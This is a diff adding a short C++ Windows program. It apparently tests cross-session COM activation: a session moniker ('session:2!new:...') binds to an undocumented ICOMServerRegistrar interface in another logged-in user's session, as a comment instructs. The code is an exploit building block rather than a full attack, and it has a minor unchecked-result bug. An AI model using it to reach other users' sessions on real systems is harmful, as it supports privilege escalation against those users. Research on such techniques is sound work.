@@ -1,0 +1,72 @@
+#include <stdio.h>
+#include <windows.h>
+#include <hstring.h>
+#include <cstdio>
+#include <cstdlib>
+#include <iostream>
+#include <string>
+#include <string.h>
+#include <windows.h>
+#include <strsafe.h>
+#include <tlhelp32.h>
+#define MAX_LENGTH 50
+#define NORMAL_LENGTH 20
+#pragma warning(disable:4996)
+
+using namespace std;
+
+class __declspec(uuid("e3a475cf-34ea-4e9a-9f3e-48ce5c6e4e57")) ITaskCompletionCallback : public IUnknown {
+public:
+    virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ INT64 p0, /* Stack Offset: 16 */ /* ENUM32 */ INT32 p1);
+};
+
+
+class __declspec(uuid("27eb33a5-77f9-4afe-ae05-6fdbbe720ee7")) ICOMServerRegistrar : public IUnknown {
+public:
+    virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ GUID* p0, /* Stack Offset: 16 */ IUnknown* p1, /* Stack Offset: 24 */ int64_t* p2);
+    virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ int64_t p0);
+    virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ int64_t p2, /* Stack Offset: 32 */ int64_t* p3, /* Stack Offset: 40 */ int64_t p4, /* Stack Offset: 48 */ int64_t p5, /* Stack Offset: 56 */ int64_t p6);
+    virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ int64_t p2, /* Stack Offset: 32 */ int64_t p3, /* Stack Offset: 40 */ int64_t* p4);
+    virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ HWND p0, /* Stack Offset: 16 */ GUID* p1, /* Stack Offset: 24 */ IUnknown** p2);
+};
+
+
+ICOMServerRegistrar* pICOMServerRegistrar;
+
+
+int main(int argc, char* argv[]) {
+
+
+    IBindCtx* pbc;
+    ULONG cEaten;
+    LPMONIKER pmk;
+
+
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    HRESULT hr = CreateBindCtx(NULL, &pbc);
+
+    if (FAILED(hr)) {
+     printf("CreateBindCtx Error \n");
+     }
+  
+    //2替换成另一个登陆的用户会话代表数字
+    hr = MkParseDisplayName(pbc, L"session:2!new:54E14197-88B0-442F-B9A3-86837061E2FB", &cEaten, &pmk);
+    if (FAILED(hr)) {
+        printf("MkParseDisplayName Error %x\n",hr);
+        return 0;
+    }
+    
+    
+    pmk->BindToObject(pbc, 0, __uuidof(pICOMServerRegistrar), (LPVOID*)&pICOMServerRegistrar);
+    if (FAILED(hr)) {
+        printf("BindMoniker Error \n");
+        return 0;
+    
+    }
+    
+    printf("pICOMServerRegistrar %x\n", pICOMServerRegistrar);
+ 
+         
+    return 0;
+}
